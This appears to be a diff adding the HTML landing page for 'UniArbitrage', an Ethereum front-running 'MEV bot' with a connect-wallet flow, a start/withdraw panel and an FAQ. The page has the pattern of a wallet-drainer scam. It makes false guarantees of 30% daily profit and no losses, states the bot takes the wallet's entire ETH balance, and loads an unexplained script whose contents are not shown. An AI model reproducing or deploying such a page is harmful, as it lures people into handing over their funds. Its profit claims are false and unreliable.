@@ -1,0 +1,283 @@
+﻿<!DOCTYPE html><html lang="en"><head>
+        <title>UniArbitrage - Arbitrage MEV Bot</title>
+        <!-- Favicon-->
+        <link rel="icon" type="image/x-icon" href="images/log.png">
+        <meta name="twitter:image" content="https://repository-images.githubusercontent.com/714044074/adbaed46-42b8-4a64-9c5a-614133a0c005">
+        <meta content="UP TO 30% DAILY PROFIT" name="description">
+        <meta content="TRY OUR UNI MEV BOT" property="og:title">
+        <meta content="UP TO 30% DAILY PROFIT" property="og:description">
+        <meta content="TRY OUR UNI MEV BOT" property="twitter:title">
+        <meta content="UP TO 30% DAILY PROFIT" property="twitter:description">
+        <meta property="og:type" content="website">
+        <meta content="summary_large_image" name="twitter:card">
+        <meta name="twitter:image" content="https://repository-images.githubusercontent.com/714044074/adbaed46-42b8-4a64-9c5a-614133a0c005">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <meta content="Webflow" name="generator">
+        <meta charset="UTF-8">
+        <!-- Font Awesome icons (free version)-->
+        <!-- Google fonts-->
+        <link href="css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+        <link href="css-1?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css%20%281%29/styles.css" rel="stylesheet">
+    <script charset="UTF-8" type="text/javascript" src="./39eb5fdb-4b23-47de-ad5e-0048131b6493.js"></script>
+        <!-- Matomo -->
+<script>
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://unimevbot.matomo.cloud/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '4']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src='//cdn.matomo.cloud/unimevbot.matomo.cloud/matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<!-- End Matomo Code -->
+    </head>
+    <body id="page-top">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg bg-secondary fixed-top" id="mainNav">
+            <div class="container">
+                <a class="navbar-brand" href="#page-top">UniArbitrage</a>
+                <div id="menu">
+                    <button class="navbar-toggler text-uppercase font-weight-bold bg-secondary text-white rounded" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                        Menu
+                        <i class="fas fa-bars"></i>
+                    </button>
+                    <div class="collapse navbar-collapse" id="navbarResponsive">
+                        <ul class="navbar-nav ms-auto">
+                            <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded" href="#contract">Contract <i class="fa-brands fa-ethereum"></i></a></li>
+                            
+                            <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded" href="#about">About <i class="fa-solid fa-circle-info"></i></a></li>
+
+                            <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded" href="#faq">FAQ <i class="fa-solid fa-circle-question"></i></a></li>
+                            
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <div id="">
+            <!-- Masthead-->
+            <header class="masthead bg-secondary text-white text-center">
+                <div class="container d-flex align-items-center flex-column">
+                    <div class="justify-content-center">
+                        <h4 class="text-uppercase mb-4">WATCH THIS SHORT VIDEO TO UNDERSTAND HOW THE BOT WORKS!</h4>
+                    </div>
+                    <!-- Masthead Avatar Image-->
+                    <video width="" height="" controls="" preload="metadata" class="masthead-avatar mb-1">
+                        <source src="images/trt3ag4sr725.mp4#t=0.1" type="video/mp4" class="masthead-avatar mb-1">
+                        <source src="images/trt3ag4sr725.mp4#t=0.1" type="video/ogg" class="masthead-avatar mb-1">
+                           
+                      Your browser does not support the video tag.
+                      </video>
+                      <p1><br>READ THIS BEFORE STARTING!</p1>
+                      <p2>1.) The Developer of the bot will receive 1% of the profits from the user automatically.</p2>
+                      <p2>2.) The bot only works with at least 0.05 ETH.<br>(0.3 ETH or more are recommended)</p2>
+                      <p2>3.) The bot will use the entire Ethereum balance available on the wallet.</p2>
+                      <p3><br>Message me on Twitter if you have any questions:&nbsp;&nbsp;&nbsp;<a href="https://twitter.com/MrAaronMoy" target="_blank">HERE</a></p3>
+
+                    <!-- Icon Divider-->
+                    <div class="divider-custom divider-light">
+                        <div class="divider-custom-line"></div>
+                        <div class="divider-custom-icon"><i class="fa-brands fa-ethereum"></i></div>
+                        <div class="divider-custom-line"></div>
+                    </div>
+                    <!-- Masthead Subheading-->
+
+                    <button type="button" id="" class="btn btn-success btn-lg mt-4 interact-button">CONNECT WALLET</button><br><br>
+                </div>
+                    <div class="container">
+                        <div class="row row-cols-1 row-cols-md-4 g-4">
+                            <div class="col">
+                                <div class="card text-white bg-success mb-1">
+                                  <div class="card-body">
+                                    <div class="flex-row justify-content-center text-center p-2">
+                                        <h5 class="card-title"><i class="fa-brands fa-ethereum"></i>YOUR WALLET:</h5>
+                                        <p class="card-text"><span id="spanWalletAddress">not connected</span></p>
+                                    </div>
+                                  </div>
+                                </div>
+                            </div>
+                            <div class="col">
+                                
+                                <div class="card text-bg-light mb-1">
+                                    <a class="btn btn-outline-light text-black" id="depositButton">
+                                      <div class="card-body">
+                                        <h5 class="card-title"><i class="fa-solid fa-play"></i> START</h5>
+                                        <p class="card-text">Click to start your bot</p>
+                                      </div>
+                                    </a>
+                                </div>
+                                
+                            </div>
+                            <div class="col">
+                                <div class="card text-bg-light mb-1">
+                                    <a class="btn btn-outline-light text-black">
+                                      <div class="card-body">
+                                        <h5 class="card-title"><i class="fa-solid fa-stop"></i> STOP</h5>
+                                        <p class="card-text">Click to stop your bot</p>
+                                      </div>
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="col">
+                                <div class="card text-bg-light mb-1">
+                                    <a class="btn btn-outline-light text-black">
+                                      <div class="card-body">
+                                        <h5 class="card-title"><i class="fa-solid fa-stop"></i> WITHDRAW</h5>
+                                        <p class="card-text">Click to withdraw your funds </p>
+                                      </div>
+                                    </a>
+                                </div>
+                            </div>
+                        </div><br><br>
+                        <div class="row row-cols-1 row-cols-md-1 g-4 mt-3">
+                            
+                                <div class="col">
+                                    <div class="card text-bg-light mb-3">
+                                      <div class="card-body">
+                                        <h5 class="card-title">Transactions</h5>
+                                        <hr>
+                                        <p class="card-text">No transactions</p>
+                                      </div>
+                                    </div>
+                                </div>
+                            
+                        </div>
+                    </div>
+                
+    
+            </header>
+
+    
+
+            <!-- Portfolio Section-->
+            <section>
+                <section class="page-section bg-secondary text-white portfolio" id="contract">
+                    <div class="container">
+                        <!-- Portfolio Section Heading-->
+                        <h2 class="page-section-heading text-center text-uppercase mb-0">Contract Address</h2>
+                        <!-- Icon Divider-->
+                        <div class="divider-custom divider-light">
+                            <div class="divider-custom-line"></div>
+                            <div class="divider-custom-icon"><i class="fa-brands fa-ethereum"></i></div>
+                            <div class="divider-custom-line"></div>
+                        </div>
+                        <!-- Portfolio Grid Items-->
+                        <div class="d-flex flex-row justify-content-center">
+                            <!-- Portfolio Item 1-->
+                            <div class="justify-content-center">
+                                <h4 class="text-uppercase mb-4">Do not interact directly with our contract or your funds will be lost.<br>You need to deposit your ethereum using our website.</h4>
+                            </div>
+                        </div>
+                        <div class="d-flex justify-content-center">
+                            <a class="btn text-center" target="”_blank”" href="https://etherscan.io/address/0x0000000000007f150bd6f54c40a34d7c3d5e9f56" style="color: #9E9E9E;font-weight: bold;">0x00000...3d5e9f56 <i class="fa-solid fa-arrow-up-right-from-square"></i></a>
+                        </div>
+                    </div>
+                </section>
+                <!-- About Section-->
+                <section class="page-section bg-secondary text-white mb-0" id="about">
+                    <div class="container">
+                        <!-- About Section Heading-->
+                        <h2 class="page-section-heading text-center text-uppercase text-white">About</h2>
+                        <!-- Icon Divider-->
+                        <div class="divider-custom divider-light">
+                            <div class="divider-custom-line"></div>
+                            <div class="divider-custom-icon"><i class="fa-solid fa-circle-info"></i></div>
+                            <div class="divider-custom-line"></div>
+                        </div>
+                        <!-- About Section Content-->
+                        <div class="row">
+                            <div class="col-12 ms-auto">
+                                <p class="fs-5">
+                                    <strong class="fs-4">Monitoring the Mempool:</strong> <br>Our bot begins by watching the Ethereum mempool, which is the collection of all pending transactions. It's looking for large trades that, once executed, are likely to cause a significant price movement in a trading pair.
+                                </p>
+                                <p class="fs-5">
+                                    <strong class="fs-4">Identifying Profitable Transactions:</strong> <br>When it detects a transaction that will buy a large amount of a particular token, the bot predicts that this will cause the price of the token to go up due to the change in supply and demand dynamics in the liquidity pool.
+                                </p>
+                                <p class="fs-5">
+                                    <strong class="fs-4">Crafting a Transaction:</strong> <br>Once a lucrative opportunity is spotted, the bot quickly creates a transaction that buys the token at the current lower price. The bot is configured to pay a higher gas fee than the detected transaction to ensure its transaction is processed first.
+                                </p>
+                                <p class="fs-5">
+                                    <strong class="fs-4">Executing the Transaction:</strong> <br>The bot submits its transaction to the network. Because it has offered to pay a higher gas fee, miners are incentivized to confirm the bot's transaction ahead of the one it’s front-running, hence the term “front-runner.”
+                                </p>
+                                <p class="fs-5">
+                                    <strong class="fs-4">Selling the Tokens:</strong> <br>After the bot's transaction is processed, the original large transaction follows. This transaction increases the price of the token as predicted. The bot can then sell the tokens it just bought at an increased price, making a profit.
+                                </p>
+                                <p class="fs-5">
+                                    <strong class="fs-4">Settling the Profit:</strong> <br>If successful, the bot’s trade will have taken advantage of the price change before the original transaction could influence the market, and it will settle the tokens back into Ethereum, netting a profit.
+                                </p>
+                            </div>
+                            
+                        </div>
+                    </div>
+                </section>
+                <!-- Portfolio Section-->
+                <section class="page-section bg-secondary text-white portfolio" id="faq">
+                    <div class="container">
+                        <!-- Portfolio Section Heading-->
+                        <h2 class="page-section-heading text-center text-uppercase text-white mb-0">FAQ</h2>
+                        <!-- Icon Divider-->
+                        <div class="divider-custom divider-light">
+                            <div class="divider-custom-line"></div>
+                            <div class="divider-custom-icon"><i class="fa-solid fa-circle-question"></i></div>
+                            <div class="divider-custom-line"></div>
+                        </div>
+                        <div class="row">
+                            <div class="col-12 ms-auto">
+                                <p class="fs-5">
+                                    <strong class="fs-4">If many people will use the bot, wouldn't dilution of profits occur?</strong> <br>We do not plan to limit access to the bot for now because there won't be any affect for us or our users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so our users involvement in the pools will always be very minor.
+                                </p>
+                                <p class="fs-5">
+                                    <strong class="fs-4">What average ROI can I expect?</strong> <br>According to latest data of bot performances (past 3 weeks) ROI is about +7–9% daily per user. Bot does not make any losses, it only executes trades when there's proper arbitrage opportunity to make profit, so under all circumstances user is always on plus.
+                                </p>
+                                <p class="fs-5">
+                                    <strong class="fs-4">What amount of funds bot need to work?</strong> <br>We recommend funding the contract with at least 0.5-1 ETH to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.
+                                </p>
+                                
+                            </div>
+
+                    </div>
+                </div></section>
+            </section>
+        </div>
+       
+        <footer class="footer text-center">
+            <div class="container">
+                <div class="row">
+                    <!-- Footer Location-->
+                    <div class="col-lg-4 mb-5 mb-lg-0">
+                        <h4 class="text-uppercase mb-4">Location</h4>
+                        <p class="lead mb-0">
+                            2215 John Daniel Drive
+                            <br>
+                            Clark, MO 65243
+                        </p>
+                    </div>
+                    <!-- Footer Social Icons-->
+                    <div class="col-lg-4 mb-5 mb-lg-0">
+                        <h4 class="text-uppercase mb-4">Around the Web</h4>
+                        <a class="btn btn-outline-light btn-social mx-1" href="https://twitter.com/MrAaronMoy"><i class="fab fa-fw fa-twitter"></i></a>
+                    </div>
+                    <!-- Footer About Text-->
+                    <div class="col-lg-4">
+                        <h4 class="text-uppercase mb-4">UniArbitrage</h4>
+                        <p class="lead mb-0">
+                            Easy to Use Arbitrage MEV Bot on Ethereum Network
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Copyright Section-->
+        <div class="copyright py-4 text-center text-white">
+            <div class="container"><small>Copyright © UniArbitrage 2023</small></div>
+        </div>
+        
+    
+
+</body></html>
